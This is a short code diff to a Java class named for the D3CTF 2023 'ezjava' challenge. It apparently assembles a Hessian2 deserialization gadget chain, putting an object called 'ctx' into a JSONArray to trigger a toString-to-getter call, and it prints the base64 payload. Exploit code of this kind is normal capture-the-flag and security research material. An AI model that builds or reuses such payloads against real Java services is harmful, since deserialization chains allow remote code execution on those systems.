@@ -28,13 +28,10 @@ public class D3CTF2023Ezjava {
 
         // toString2Getter
         JSONArray jsonArray = new JSONArray();
-        jsonArray.add(new TestUtils());
-
-//        Object bd = GBadAttributeValueExpException.deserialize2ToString(jsonArray);
+        jsonArray.add(ctx);
 
         byte[] code = SerializeUtils.hessian2SerializeThrowExpectToString(jsonArray);
         System.out.println(MiscUtils.base64Encode(code));
-        Object o = SerializeUtils.hessian2Deserialize(code);
-        System.out.println(o);
+        SerializeUtils.hessian2Deserialize(code);
     }
 }
